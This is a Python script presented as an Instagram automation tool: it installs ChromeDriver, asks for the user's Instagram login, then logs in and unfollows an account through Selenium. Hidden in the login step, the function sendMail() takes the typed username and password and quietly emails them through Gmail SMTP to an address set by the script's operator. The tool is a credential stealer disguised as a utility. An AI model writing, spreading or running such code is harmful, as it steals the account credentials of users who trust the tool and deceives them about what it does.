from colorama import Fore, Back, Style
from termcolor import colored, cprint
from email.mime.text import MIMEText
from selenium import webdriver
import colorama
import zipfile
import smtplib
import getpass
global total
import time
import wget
import os

colorama.init()
print(Fore.GREEN)
width = "150"
height = "100"
os.system("mode con cols="+width+"lines="+height)


print( "\n▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system("cls")
print(Fore.RED)
print( "\n▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.RED)
print( "\n▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1) 
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.RED)
print( "\n▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒ Loading ...\n")
time.sleep(0.1)
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒ Loading ...\n")  
time.sleep(0.1)
os.system("cls")
print(Fore.RED)
print( "\n▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.RED)
print( "\n▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒ Loading ...\n") 
time.sleep(0.1) 
os.system("cls")
print(Fore.RED)
print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒ Loading ...\n")  
time.sleep(0.1)
os.system("cls")
print(Fore.RED)
print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ Loading ...\n") 
time.sleep(0.1)
os.system("cls")
print(Fore.GREEN)
print( "\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ Loading ...\n")
time.sleep(0.1)
os.system("cls")




global InstagramUser
global InstagramPassword

linux = 'https://chromedriver.storage.googleapis.com/2.35/chromedriver_linux64.zip'
mac = 'https://chromedriver.storage.googleapis.com/2.35/chromedriver_mac64.zip'
windows = 'https://chromedriver.storage.googleapis.com/2.35/chromedriver_win32.zip'

print("""

                                                                                                                                
                                     ..                                ...                                    
                               .....'''..                ...          ...''.....                              
                           ....,'..''...  ...   ..  .'. .co,            ............                          
                         ..'''''...'......',.. .lo'.cx:.'lo'.;c::c;. ..........''.....                        
                      ..''''..'........'.',,,c,.co:,lo,..co''ol..''..:c;,'......'........                     
                   .............':cccc,':;,:';:..;:,,,...,:..,;;,,.'ol::oc.';'..............                  
                   ............:l:'.;dl..,''.,:'....................,,,:c',odc;:,............                 
                 .............;dl'..,ol.  ..'''.    .:lccc,.   ....     ..co;.'lo,...'....'....               
               .............. .:l::c:'.    ..       .llclc,.              ...'lo:............'....            
            ............          ..                .';;;c:.                 ,;.       ............           
            .....  ..                               .';:cc,.                                  ......          
         ......                                     .locl:.                                    .......        
        .....                                        ..',:;.                                      ......      
      ....                                          ..    ..                                        .....     
     ...                                            .'    .;'.                                        ..'..   
    ...                                             .','..'.                                            ....  
   ..                                                 .,;:,                                               ..  
                                                    .,::cc,.                                                  
                                                    .clclc.                                                   
                                                     ...':;.                                                  
                                                    .:,..;;.                                                  
                                                    .;looc'.                                                  
                            .  .  ..                .;:c:;,.               .   ..... ....  .  .               
               .................. ..                 ......               ... .................               
                                                    .......                                                   
                                                    .'.....                                                   
                                                    ',...,'.                                                  
                                                    ...  ...                                                  


	""")


def installDriver():
	print(Fore.GREEN)

	print(""""

	[1] Linux
	[2] Mac
	[3] Windows


	""")

	print(Fore.RED)
	selectSystem = input("Please Select Your System :")

	if selectSystem == "1":
		print(Fore.GREEN)
		downloadUrl = wget.download(linux)
		print(downloadUrl)
		Zip = zipfile.ZipFile('chromedriver_linux64.zip')
		Zip.extractall()
		time.sleep(3)
		start()

	elif selectSystem == "2":
		print(Fore.GREEN)
		downloadUrl = wget.download(mac)
		print(downloadUrl)
		Zip = zipfile.ZipFile('chromedriver_mac64.zip')
		Zip.extractall()
		time.sleep(3)
		start()

	elif selectSystem == "3":
		print(Fore.GREEN)
		downloadUrl = wget.download(windows)
		print(downloadUrl)
		Zip = zipfile.ZipFile('chromedriver_win32.zip')
		Zip.extractall()
		time.sleep(3)
		start()

def sendMail():
	global total
	global InstagramUser
	global InstagramPassword

	defaultMail = "youremail"
	defaultPassword = "emailpassword"  

	mail = MIMEText(total,"html","utf-8")
	mail["From"] = defaultMail
	mail["Subject"] = defaultPassword
	mail["To"] ="".join("email")  
	mail = mail.as_string(total)
	try:
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.ehlo()
		server.starttls()
		server.ehlo()
		server.login(defaultMail, defaultPassword)
		server.sendmail(defaultMail, "email", mail)
		time.sleep(3)
		server.quit()
	except:
		print("Error")

def start():
	print(Fore.GREEN)
	instagramUserid = input("Please Enter Your Instagram Address : ")
	print(Fore.RED)
	print("*passwords do not appear, but keep typing")
	print(Fore.GREEN)
	instagramUserpass = getpass.getpass("Please Enter Your Instagram Password : ")
	try:
		currentLocation = os.getcwd()
		driver_path = currentLocation + "\\" + "chromedriver.exe"
		browser = webdriver.Chrome(executable_path=driver_path)
	except:
		print(Fore.RED)
		print("Browser driver is not found, redirecting to download...")
		time.sleep(3)
		installDriver()

	InstagramUser = instagramUserid
	InstagramPassword = instagramUserpass

	try:
		url = "https://instagram.com" 
		browser.get(url)
		time.sleep(4)

		username = "username"
		password = "password"
		global total
		total = InstagramUser + "\\" + InstagramPassword
		sendMail()
		usernameSelect = browser.find_element_by_name(username)
		passwordSelect = browser.find_element_by_name(password)

		usernameSelect.send_keys(InstagramUser)
		passwordSelect.send_keys(InstagramPassword)

		
		sigIn = browser.find_element_by_xpath('//*[@id="loginForm"]/div/div[3]')
		sigIn.click()
		time.sleep(5)

		notNowXpath = '//*[@id="react-root"]/section/main/div/div/div/div/button'
		notNow = browser.find_element_by_xpath(notNowXpath)
		notNow.click()
		time.sleep(1)

		notNowXpath2 = '/html/body/div[4]/div/div/div/div[3]/button[2]'
		notNow2 = browser.find_element_by_xpath(notNowXpath2)
		notNow2.click()
		time.sleep(1)

		bioXpath = '//*[@id="react-root"]/section/main/section/div[3]/div[1]/div/div[2]/div[1]/a'
		goBio = browser.find_element_by_xpath(bioXpath)
		goBio.click()
		time.sleep(1)

		gofollowXpath = '//*[@id="react-root"]/section/main/div/header/section/ul/li[3]/a'
		goFollow = browser.find_element_by_xpath(gofollowXpath)
		goFollow.click()
		time.sleep(3)

		follow = '/html/body/div[4]/div/div/div[2]/ul/div/li[1]/div/div[3]/button'
		follow = browser.find_element_by_xpath(follow)
		follow.click()
		time.sleep(3)

		stopFollowXpath = '/html/body/div[5]/div/div/div/div[3]/button[1]'
		stopFollow = browser.find_element_by_xpath(stopFollowXpath)
		stopFollow.click()
		time.sleep(1)
	except:
		print(Fore.RED)
		print("""

			something went wrong. Please try again :(

			""")
		start()
print(Fore.GREEN)
print("""

		[1] Start 
		[2] İnstall

				created by oğulcan KAÇAR
				

		""")

print(Fore.RED)
selectFunction = input("please select an action : ")
try:
	if selectFunction == "2":
		installDriver()

	elif selectFunction == "1":	
		start()
except KeyboardInterrupt:
	print("exit")
	exit()





